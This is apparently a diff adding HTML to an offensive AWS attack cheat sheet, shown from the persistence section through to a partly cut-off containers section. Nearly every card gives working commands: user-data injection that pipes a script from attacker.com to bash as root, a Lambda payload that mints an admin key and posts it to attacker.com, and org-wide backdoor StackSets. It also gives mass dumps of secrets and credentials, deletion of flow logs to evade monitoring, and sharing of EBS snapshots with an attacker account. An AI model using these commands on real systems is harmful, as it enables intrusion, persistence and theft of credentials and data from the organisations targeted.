+<span class="badge bh">HIGH</span><span class="badge bt">T1037.004</span>
+<div class="cd">Inject malicious user data into stopped EC2 instances or launch templates. Executes as root on next boot.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4DC; User Data Injection <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ec2 stop-instances --instance-ids i-TARGET
+
+PAYLOAD=$(echo '#!/bin/bash
+curl -s https://attacker.com/agent.sh | bash' | base64 -w 0)
+
+aws ec2 modify-instance-attribute   --instance-id i-TARGET   --attribute userData   --value $PAYLOAD
+
+aws ec2 start-instances --instance-ids i-TARGET</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">6. Org-Wide StackSet Backdoor</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1078</span>
+<div class="cd">From the management account, deploy StackSets to create IAM backdoors in every member account in the organization simultaneously.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F3E2; Organization Persistence <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws cloudformation create-stack-set   --stack-set-name "org-wide-monitoring"   --template-body file:///tmp/backdoor.json   --capabilities CAPABILITY_NAMED_IAM   --permission-model SERVICE_MANAGED   --auto-deployment Enabled=true,RetainStacksOnAccountRemoval=true
+
+aws cloudformation create-stack-instances   --stack-set-name "org-wide-monitoring"   --deployment-targets OrganizationalUnitIds=r-ROOTID   --regions us-east-1
+<span class="cm"># Deploys backdoor to every account in org</span></code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== CREDENTIAL ACCESS ========== -->
+<section id="cred" class="section">
+<h2 class="pt">&#x1F511; Credential Access</h2>
+<p class="ps">Stealing AWS credentials, secrets, tokens and keys from the environment</p>
+
+<div class="card"><div class="ct">1. EC2 Instance Metadata Service (IMDS)</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1552.005</span>
+<div class="cd">The IMDS at 169.254.169.254 provides temporary IAM role credentials to any process running on an EC2 instance. No authentication required.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CB; Full IMDS Enumeration <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Get role name</span>
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="cm"># Get temporary credentials</span>
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+<span class="cm"># Get user data (often contains secrets)</span>
+curl -s http://169.254.169.254/latest/user-data
+
+<span class="cm"># Full metadata tree</span>
+curl -s http://169.254.169.254/latest/meta-data/
+<span class="cm"># hostname, placement/, network/, tags/instance/</span></code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Secrets Manager Bulk Extraction</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1555</span>
+<div class="cd">With secretsmanager:GetSecretValue, dump every secret in the account. Commonly holds DB passwords, API keys, OAuth tokens, TLS certs, SSH keys, payment credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E4; Mass Extraction <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws secretsmanager list-secrets   --query "SecretList[*].Name" -o text |   tr '	' '
+' | while read s; do
+    echo "===== $s ====="
+    aws secretsmanager get-secret-value       --secret-id "$s" --query SecretString -o text 2>/dev/null
+    echo ""
+  done > /tmp/all-secrets.txt</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. SSM Parameter Store Dump</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1552.001</span>
+<div class="cd">Parameter Store contains SecureString parameters encrypted with KMS. With ssm:GetParametersByPath and kms:Decrypt, retrieve all encrypted values.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CC; Parameter Dump <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Dump all parameters recursively with decryption</span>
+aws ssm get-parameters-by-path   --path "/" --recursive --with-decryption   --query "Parameters[*].[Name,Value]" -o table
+
+<span class="cm"># Target specific paths</span>
+for path in /prod /staging /database /secrets; do
+  echo "=== $path ==="
+  aws ssm get-parameters-by-path --path $path     --recursive --with-decryption     --query "Parameters[*].[Name,Value]" -o text 2>/dev/null
+done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. Lambda Environment Variable Harvest</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1552</span>
+<div class="cd">Lambda functions commonly store DB URLs, API keys, and tokens as environment variables. One API call per function retrieves all of them.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26D4; Extract All Lambda Env Vars <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws lambda list-functions   --query "Functions[*].FunctionName" -o text |   tr '	' '
+' | while read fn; do
+    echo "=== $fn ==="
+    aws lambda get-function-configuration       --function-name "$fn"       --query "Environment.Variables" -o json 2>/dev/null
+  done
+
+<span class="cm"># Look for: DB_PASSWORD, API_KEY, SECRET_KEY</span>
+<span class="cm"># STRIPE_SECRET, GITHUB_TOKEN, SLACK_WEBHOOK_URL</span></code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">5. ECS Task Credential Endpoint</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1552.005</span>
+<div class="cd">Running ECS containers expose task role credentials at a local HTTP endpoint — different from EC2 IMDS but equally powerful.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E6; ECS Credential Theft <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># From inside any ECS container</span>
+echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+
+curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+<span class="cm"># Returns: AccessKeyId, SecretAccessKey, Token, RoleArn</span>
+
+<span class="cm"># Get full task metadata</span>
+curl -s "$ECS_CONTAINER_METADATA_URI_V4/task" | python3 -m json.tool</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">6. Credential Files on EC2 / Containers</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1552.001</span>
+<div class="cd">Developers leave long-term credentials in ~/.aws/credentials, .env files, bash history, and app config on EC2 instances.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F5C2;&#xFE0F; File System Hunt <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>cat ~/.aws/credentials
+cat ~/.bash_history | grep -i "aws\|secret\|key"
+env | grep -i "aws\|secret\|key\|token"
+find / -name ".env" 2>/dev/null | xargs grep -l "AWS" 2>/dev/null
+find / -name "credentials" -path "*/.aws/*" 2>/dev/null
+grep -r "AKIA" /home /root /var/www /opt 2>/dev/null</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== DISCOVERY ========== -->
+<section id="discovery" class="section">
+<h2 class="pt">&#x1F50D; Discovery</h2>
+<p class="ps">Enumerating the full AWS attack surface: resources, permissions, and relationships</p>
+
+<div class="card"><div class="ct">1. IAM Identity Enumeration</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1087.004</span>
+<div class="cd">Map all IAM users, roles, groups, policies to understand the identity landscape and find escalation paths.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F510; IAM Full Recon <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Current identity</span>
+aws sts get-caller-identity
+
+<span class="cm"># All users, roles, groups</span>
+aws iam list-users --query "Users[*].[UserName,CreateDate]" -o table
+aws iam list-roles --query "Roles[*].[RoleName,Arn]" -o table
+aws iam list-groups --query "Groups[*].GroupName" -o text
+
+<span class="cm"># Simulate allowed actions</span>
+USER=$(aws iam get-user --query "User.UserName" -o text)
+aws iam simulate-principal-policy   --policy-source-arn arn:aws:iam::ACCOUNT:user/$USER   --action-names "iam:CreateUser" "s3:GetObject" "lambda:InvokeFunction"   --query "EvaluationResults[?EvalDecision=='allowed'].ActionName" -o text
+
+<span class="cm"># Automated analysis</span>
+pmapper --profile TARGET graph create
+pmapper --profile TARGET analysis --suggest</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Resource Inventory Discovery</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1580</span>
+<div class="cd">Enumerate all deployed resources across all regions to understand what exists and what can be targeted.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x2601;&#xFE0F; Multi-Service Inventory <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># EC2 Instances</span>
+aws ec2 describe-instances   --query "Reservations[*].Instances[*].[InstanceId,InstanceType,PublicIpAddress,IamInstanceProfile.Arn]" -o table
+
+<span class="cm"># S3 Buckets</span>
+aws s3 ls
+
+<span class="cm"># RDS Databases</span>
+aws rds describe-db-instances   --query "DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address]" -o table
+
+<span class="cm"># Lambda Functions</span>
+aws lambda list-functions --query "Functions[*].[FunctionName,Runtime,Role]" -o table
+
+<span class="cm"># Multi-region scan</span>
+for region in $(aws ec2 describe-regions --query "Regions[*].RegionName" -o text); do
+  count=$(aws ec2 describe-instances --region $region     --query "length(Reservations)" -o text 2>/dev/null)
+  [ "$count" != "0" ] && echo "$region: $count reservations"
+done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Privilege Escalation Path Analysis</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1078</span>
+<div class="cd">Find dangerous permission combinations that allow reaching AdministratorAccess. Use automated tooling to graph all paths.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F5FA;&#xFE0F; Escalation Analysis <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># PMapper: full privilege escalation graph</span>
+pmapper --profile TARGET graph create
+pmapper --profile TARGET query "who can become Admin"
+
+<span class="cm"># Cloudsplaining: HTML risk report</span>
+aws iam get-account-authorization-details > /tmp/auth.json
+cloudsplaining scan --input /tmp/auth.json --output /tmp/report/
+
+<span class="cm"># Dangerous single permissions to look for:</span>
+<span class="cm"># iam:CreatePolicyVersion | iam:AttachUserPolicy | iam:PutUserPolicy</span>
+<span class="cm"># iam:PassRole + lambda:* | ec2:RunInstances | ecs:RegisterTaskDefinition</span>
+<span class="cm"># iam:UpdateAssumeRolePolicy | iam:CreateAccessKey</span></code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. Network Exposure Discovery</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1046</span>
+<div class="cd">Map VPCs, security groups, load balancers, and exposed services to find internet-facing attack surface.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F310; Network Recon <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Security groups open to internet</span>
+aws ec2 describe-security-groups   --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"   --query "SecurityGroups[*].[GroupId,GroupName,IpPermissions]"
+
+<span class="cm"># Public RDS instances</span>
+aws rds describe-db-instances   --query "DBInstances[?PubliclyAccessible].DBInstanceIdentifier" -o text
+
+<span class="cm"># Internet-facing load balancers</span>
+aws elbv2 describe-load-balancers   --query "LoadBalancers[?Scheme=='internet-facing'].[DNSName,Type]" -o table
+
+<span class="cm"># VPC peering (cross-account network)</span>
+aws ec2 describe-vpc-peering-connections</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== LATERAL MOVEMENT ========== -->
+<section id="lateral" class="section">
+<h2 class="pt">&#x2194;&#xFE0F; Lateral Movement</h2>
+<p class="ps">Moving between accounts, services, and trust boundaries</p>
+
+<div class="card"><div class="ct">1. Cross-Account Role Assumption Chain</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1550.001</span>
+<div class="cd">Chain role assumptions across Dev to Staging to Prod. Permissive trust policies (missing ExternalId, wildcard Principal) allow full lateral movement across the organization.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26D3;&#xFE0F; Role Chaining <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Step 1: Assume role in staging from dev</span>
+CREDS=$(aws sts assume-role   --role-arn arn:aws:iam::STAGING:role/DevDeployRole   --role-session-name lateral   --query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" -o text)
+
+export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
+export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
+
+<span class="cm"># Step 2: From staging, assume prod admin</span>
+aws sts assume-role   --role-arn arn:aws:iam::PROD:role/StagingDeployRole   --role-session-name pwned</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. PassRole Privilege Escalation</div>
+<span class="badge bc">CRITICAL</span><span class="badge bt">T1548</span>
+<div class="cd">iam:PassRole allows running code AS any role you can pass to a compute service — without directly assuming it. The cornerstone of AWS privilege escalation.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F3AD; PassRole via Lambda <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Required: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction</span>
+cat > /tmp/esc.py << 'EOF'
+import boto3
+def handler(event, context):
+    iam = boto3.client("iam")
+    iam.create_user(UserName="svc-backup")
+    iam.attach_user_policy(UserName="svc-backup",
+      PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
+    return iam.create_access_key(UserName="svc-backup")["AccessKey"]
+EOF
+cd /tmp && zip esc.zip esc.py
+
+aws lambda create-function --function-name diag-runner   --runtime python3.12 --role arn:aws:iam::ACCOUNT:role/AdminRole   --handler esc.handler --zip-file fileb:///tmp/esc.zip
+aws lambda invoke --function-name diag-runner /tmp/keys.json
+cat /tmp/keys.json</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Service-to-Service Pivot Matrix</div>
+<span class="badge bh">HIGH</span><span class="badge bt">T1550</span>
+<div class="cd">Use credentials from one service to access others. Most compute services have IAM roles providing access to multiple downstream services.</div>
+<table>
+<tr><th>From</th><th>To</th><th>Vector</th></tr>
+<tr><td>EC2 (IMDS)</td><td>S3, Secrets, RDS</td><td>EC2 role via 169.254.169.254</td></tr>
+<tr><td>Lambda</td><td>EC2, ECS, Glue, S3</td><td>Lambda execution role</td></tr>
+<tr><td>ECS Container</td><td>RDS, S3, Secrets</td><td>Task role via 169.254.170.2</td></tr>
+<tr><td>CodeBuild</td><td>ECR, S3, Secrets</td><td>Build project IAM role</td></tr>
+<tr><td>Glue Job</td><td>S3, Redshift</td><td>Glue job role</td></tr>
+<tr><td>SSO/Federation</td><td>All org accounts</td><td>Permission set assumption</td></tr>
+</table>
+</div>
+</section>
+
+<!-- ========== IAM ========== -->
+<section id="iam" class="section">
+<h2 class="pt">&#x1F510; Identity and Access Management (IAM)</h2>
+<p class="ps">21+ privilege escalation paths. Control IAM = control all of AWS.</p>
+
+<div class="card"><div class="ct">Policy Evaluation Order</div>
+<table>
+<tr><th>Layer</th><th>Who Sets It</th><th>Attack Impact</th></tr>
+<tr><td>Explicit Deny</td><td>Any policy</td><td>Always blocks — even admin</td></tr>
+<tr><td>SCP (Org)</td><td>Management account</td><td>Restricts all principals in OU</td></tr>
+<tr><td>Permission Boundary</td><td>Admin on identity</td><td>Caps maximum permissions</td></tr>
+<tr><td>Identity Policy</td><td>User/Role policy</td><td>Primary escalation target</td></tr>
+<tr><td>Resource Policy</td><td>Resource owner</td><td>Cross-account access vector</td></tr>
+</table></div>
+
+<div class="card"><div class="ct">iam:CreatePolicyVersion</div><span class="badge bc">CRITICAL</span>
+<div class="cd">Overwrite any attached policy with AdministratorAccess. Instant privilege escalation with a single API call.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Exploit <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam create-policy-version   --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'   --set-as-default</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">iam:AttachUserPolicy / AttachRolePolicy</div><span class="badge bc">CRITICAL</span>
+<div class="cd">Attach AdministratorAccess managed policy directly to self or to any role you can assume.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Exploit <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam attach-user-policy   --user-name CURRENT_USER   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+aws iam attach-role-policy   --role-name TargetRole   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">iam:PutUserPolicy / PutRolePolicy (Inline)</div><span class="badge bc">CRITICAL</span>
+<div class="cd">Create an inline admin policy on any principal. Inline policies are embedded in the identity and harder to spot in policy listings.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Exploit <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam put-user-policy   --user-name CURRENT_USER   --policy-name SystemAccess   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">iam:CreateAccessKey (for another user)</div><span class="badge bc">CRITICAL</span>
+<div class="cd">Create a permanent access key for any existing admin user. No expiry, survives all incident response except explicit deletion.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Exploit <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find admin users</span>
+aws iam list-users --query "Users[*].UserName" -o text
+
+<span class="cm"># Create key</span>
+aws iam create-access-key --user-name admin-user</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">iam:UpdateAssumeRolePolicy</div><span class="badge bc">CRITICAL</span>
+<div class="cd">Modify a role trust policy so current user can directly assume an admin role.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Exploit <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws iam update-assume-role-policy   --role-name AdminRole   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/CURRENT_USER"},"Action":"sts:AssumeRole"}]}'
+
+aws sts assume-role   --role-arn arn:aws:iam::ACCOUNT:role/AdminRole   --role-session-name session</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">PassRole Service Matrix</div><span class="badge bc">CRITICAL</span>
+<div class="cd">iam:PassRole combined with any of these service permissions creates a code execution path as any passable role.</div>
+<table>
+<tr><th>Additional Permission</th><th>Service</th><th>Attack</th></tr>
+<tr><td>lambda:CreateFunction + lambda:InvokeFunction</td><td>Lambda</td><td>Run code as any role</td></tr>
+<tr><td>ec2:RunInstances</td><td>EC2</td><td>Launch instance with role</td></tr>
+<tr><td>ecs:RegisterTaskDefinition + ecs:RunTask</td><td>ECS</td><td>Container as role</td></tr>
+<tr><td>glue:CreateDevEndpoint</td><td>Glue</td><td>SSH shell as role</td></tr>
+<tr><td>cloudformation:CreateStack</td><td>CFN</td><td>Stack deploys as role</td></tr>
+<tr><td>codebuild:CreateProject + StartBuild</td><td>CodeBuild</td><td>Build runs as role</td></tr>
+<tr><td>sagemaker:CreateNotebookInstance</td><td>SageMaker</td><td>Notebook as role</td></tr>
+</table></div>
+</section>
+
+<!-- ========== VPC ========== -->
+<section id="vpc" class="section">
+<h2 class="pt">&#x1F310; Virtual Private Cloud (VPC)</h2>
+<p class="ps">Network layer attacks: isolation bypass and traffic manipulation</p>
+
+<div class="card"><div class="ct">1. Security Group Manipulation</div><span class="badge bh">HIGH</span><span class="badge bt">T1562.007</span>
+<div class="cd">Modify ingress rules to expose EC2, RDS, Elasticsearch and other services to attacker IP or the internet.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F513; Open Inbound Access <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find SGs attached to instances</span>
+aws ec2 describe-instances   --query "Reservations[*].Instances[*].[InstanceId,SecurityGroups[*].GroupId]" -o table
+
+<span class="cm"># Open SSH from internet</span>
+aws ec2 authorize-security-group-ingress   --group-id sg-TARGET --protocol tcp --port 22 --cidr 0.0.0.0/0
+
+<span class="cm"># Open RDS to attacker IP only (stealthier)</span>
+aws ec2 authorize-security-group-ingress   --group-id sg-RDS --protocol tcp --port 3306 --cidr ATTACKER_IP/32</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. VPC Flow Logs Disabling</div><span class="badge bm">MEDIUM</span><span class="badge bt">T1562.008</span>
+<div class="cd">Delete flow logs before port scans and lateral movement to prevent SOC from seeing network activity.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F6AB; Disable Network Logging <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ec2 describe-flow-logs   --query "FlowLogs[*].[FlowLogId,ResourceId]" -o table
+
+aws ec2 delete-flow-logs   --flow-log-ids $(aws ec2 describe-flow-logs     --query "FlowLogs[*].FlowLogId" -o text)</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Internet Gateway Exposure</div><span class="badge bh">HIGH</span><span class="badge bt">T1583</span>
+<div class="cd">Attach an internet gateway to a private VPC, creating internet egress for data exfiltration from previously isolated instances.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F30F; Expose Private VPC <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>IGW=$(aws ec2 create-internet-gateway   --query "InternetGateway.InternetGatewayId" -o text)
+aws ec2 attach-internet-gateway   --internet-gateway-id $IGW --vpc-id vpc-TARGET
+aws ec2 create-route   --route-table-id rtb-TARGET   --destination-cidr-block 0.0.0.0/0   --gateway-id $IGW</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== EC2 ========== -->
+<section id="ec2" class="section">
+<h2 class="pt">&#x1F4BB; Elastic Compute Cloud (EC2)</h2>
+<p class="ps">Instance compromise, metadata exploitation, and volume exfiltration</p>
+
+<div class="card"><div class="ct">1. IMDS Credential Theft</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1552.005</span>
+<div class="cd">Query 169.254.169.254 from within any EC2 instance to steal attached role credentials. See Credential Access section for full commands.</div></div>
+
+<div class="card"><div class="ct">2. User Data Script Injection</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1059</span>
+<div class="cd">Inject malicious scripts into stopped instances or launch templates. Runs as root on next boot.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4DC; User Data Attack <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ec2 stop-instances --instance-ids i-TARGET
+
+PAYLOAD=$(echo '#!/bin/bash
+curl -s https://attacker.com/agent.sh | bash' | base64 -w 0)
+
+aws ec2 modify-instance-attribute   --instance-id i-TARGET   --attribute userData   --value $PAYLOAD
+
+aws ec2 start-instances --instance-ids i-TARGET</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. EBS Snapshot Exfiltration</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1537</span>
+<div class="cd">Snapshot any volume, share with attacker account, restore and mount offline to read all data.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4F7; Snapshot Chain <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Create snapshot</span>
+SNAP=$(aws ec2 create-snapshot --volume-id vol-TARGET   --description "automated-backup" --query "SnapshotId" -o text)
+
+<span class="cm"># Share with attacker account</span>
+aws ec2 modify-snapshot-attribute --snapshot-id $SNAP   --attribute createVolumePermission   --operation-type add --user-ids ATTACKER_ACCOUNT_ID
+
+<span class="cm"># From attacker account: restore and mount</span>
+aws ec2 create-volume --snapshot-id $SNAP --availability-zone us-east-1a
+aws ec2 attach-volume --volume-id vol-NEW   --instance-id i-ATTACKER --device /dev/sdf
+sudo mount /dev/xvdf1 /mnt/victim</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. EC2 Instance Connect Key Injection</div><span class="badge bh">HIGH</span><span class="badge bt">T1098</span>
+<div class="cd">Push a temporary SSH public key to any instance for 60 seconds using EC2 Instance Connect — enough to establish connection.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F511; Key Injection <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>ssh-keygen -t rsa -f /tmp/ec2key -N "" -q
+
+aws ec2-instance-connect send-ssh-public-key   --instance-id i-TARGET   --instance-os-user ec2-user   --ssh-public-key file:///tmp/ec2key.pub
+
+ssh -i /tmp/ec2key ec2-user@INSTANCE_IP</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== LAMBDA ========== -->
+<section id="lambda" class="section">
+<h2 class="pt">&#x2699;&#xFE0F; Lambda Functions</h2>
+<p class="ps">Serverless exploitation: code injection, role abuse, supply chain</p>
+
+<div class="card"><div class="ct">1. UpdateFunctionCode — Most Dangerous Single Permission</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1648</span>
+<div class="cd">lambda:UpdateFunctionCode alone allows injecting code into any Lambda with an admin role. No PassRole needed.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F534; Code Injection <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Find functions with powerful roles</span>
+aws lambda list-functions   --query "Functions[*].[FunctionName,Role]" -o table
+
+<span class="cm"># Inject payload into existing function</span>
+cat > /tmp/inject.py << 'EOF'
+import boto3, urllib.request, json
+def handler(event, context):
+    iam = boto3.client("iam")
+    key = iam.create_access_key(UserName="admin")["AccessKey"]
+    urllib.request.urlopen(urllib.request.Request(
+      "https://attacker.com/c",
+      data=json.dumps(key).encode(), method="POST"))
+    return {"statusCode": 200, "body": "OK"}
+EOF
+cd /tmp && zip inject.zip inject.py
+
+aws lambda update-function-code   --function-name TARGET_FUNCTION   --zip-file fileb:///tmp/inject.zip
+
+aws lambda invoke --function-name TARGET_FUNCTION /tmp/result.json</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. PassRole + CreateFunction + InvokeFunction</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1648</span>
+<div class="cd">Classic Lambda privilege escalation. Three permissions = complete code execution as any passable role.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x26A1; Classic Escalation <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>cat > /tmp/esc.py << 'EOF'
+import boto3
+def handler(event, context):
+    iam = boto3.client("iam")
+    iam.create_user(UserName="backdoor-svc")
+    iam.attach_user_policy(UserName="backdoor-svc",
+      PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
+    return iam.create_access_key(UserName="backdoor-svc")["AccessKey"]
+EOF
+cd /tmp && zip esc.zip esc.py
+
+aws lambda create-function --function-name util-runner   --runtime python3.12 --role arn:aws:iam::ACCOUNT:role/AdminRole   --handler esc.handler --zip-file fileb:///tmp/esc.zip
+aws lambda invoke --function-name util-runner /tmp/out.json</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Lambda Public URL (Unauthenticated Invoke)</div><span class="badge bh">HIGH</span><span class="badge bt">T1190</span>
+<div class="cd">Create a public function URL with no auth — any internet user can invoke the Lambda and use its IAM role permissions.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F310; Public Endpoint <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws lambda create-function-url-config   --function-name target-function --auth-type NONE
+
+aws lambda add-permission   --function-name target-function   --statement-id public-access   --action lambda:InvokeFunctionUrl   --principal "*" --function-url-auth-type NONE
+
+<span class="cm"># Now publicly invocable</span>
+curl -X POST https://XXXXXXX.lambda-url.us-east-1.on.aws/</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. Lambda Event Source Mapping (DB Tap)</div><span class="badge bh">HIGH</span><span class="badge bt">T1648</span>
+<div class="cd">Create an event source mapping so a malicious Lambda is automatically triggered by every DynamoDB write — passive database eavesdropping.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E1; Database Tap <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Get DynamoDB stream ARN</span>
+aws dynamodb describe-table --table-name prod-users   --query "Table.LatestStreamArn" -o text
+
+<span class="cm"># Map stream to exfil Lambda</span>
+aws lambda create-event-source-mapping   --function-name db-exfil-function   --event-source-arn STREAM_ARN   --batch-size 100   --starting-position LATEST</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== CONTAINERS ========== -->
+<section id="containers" class="section">
+<h2 class="pt">&#x1F4E6; Containers — ECS &amp; EKS</h2>
+<p class="ps">Container attacks: task hijacking, escape, and image poisoning</p>
+
+<div class="card"><div class="ct">1. ECS Task Credential Endpoint</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1552.005</span>
+<div class="cd">From inside any ECS container, query the task metadata endpoint to steal the task IAM role credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E6; Credential Theft <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># From inside running ECS container</span>
+echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+
+curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+<span class="cm"># Returns: AccessKeyId, SecretAccessKey, Token, RoleArn</span>
+
+curl -s "$ECS_CONTAINER_METADATA_URI_V4/task" | python3 -m json.tool</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. ECS ExecuteCommand</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1609</span>
+<div class="cd">Execute arbitrary commands inside running containers without SSH. Requires ecs:ExecuteCommand permission.</div>
